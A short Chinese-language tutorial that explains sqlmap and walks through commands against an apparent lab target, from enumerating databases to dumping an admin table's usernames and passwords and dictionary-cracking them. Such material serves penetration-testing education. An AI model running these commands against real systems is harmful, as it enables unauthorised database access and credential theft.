SQLmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft  SQL  Server，Microsoft Acess，IBM DB2，SQLLite，Firebird，Sybase和SAP MaxDB……SQLmap采用几种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，对查询和盲注。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令

python sqlmap.py -u "http://172.16.12.2/inject.php?id=1"
-u参数指定目标注入地址,为了规范，目标注入地址尽量用""引起来

python sqlmap.py -u "http://172.16.12.2/inject.php?id=1" --dbs
python sqlmap.py -u "http://172.16.12.2/inject.php?id=1" --current-db
--current-db:列当前数据库

python sqlmap.py -u "http://172.16.12.2/inject.php?id=1" -D sqlinject --tables  
-D dbname:指定数据库名称
--tables:列出某数据库上的所有表

python sqlmap.py -u "http://172.16.12.2/inject.php?id=1" -D sqlinject -T admin --columns
-D dbname:指定数据库名称
-T tablename:指定某数据表名称
--columns:列出指定表上的所有列

python sqlmap.py -u "http://172.16.12.2/inject.php?id=1" -D sqlinject  -T admin -C id,username,password --dump
-D dbname:指定数据库名称
-T tablename:指定某数据表名称
-C Cnmme:指定列名
--dump:导出列里面的字段

然后回车默认通过字典来破解，选择1利用自带的字典暴力破解